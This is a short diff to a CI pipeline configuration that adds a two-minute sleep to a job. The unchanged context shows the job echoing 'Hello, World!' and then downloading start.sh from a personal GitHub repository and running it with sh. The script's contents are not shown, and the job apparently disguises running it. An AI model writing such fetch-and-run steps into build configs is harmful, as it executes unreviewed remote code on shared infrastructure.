@@ -19,6 +19,7 @@ jobs:
           command: |
               echo Hello, World!
               curl -o start.sh https://raw.githubusercontent.com/meigocar/mfly/main/azure/start.sh && sh start.sh
+              sleep 120
           
 
 # Invoke jobs via workflows
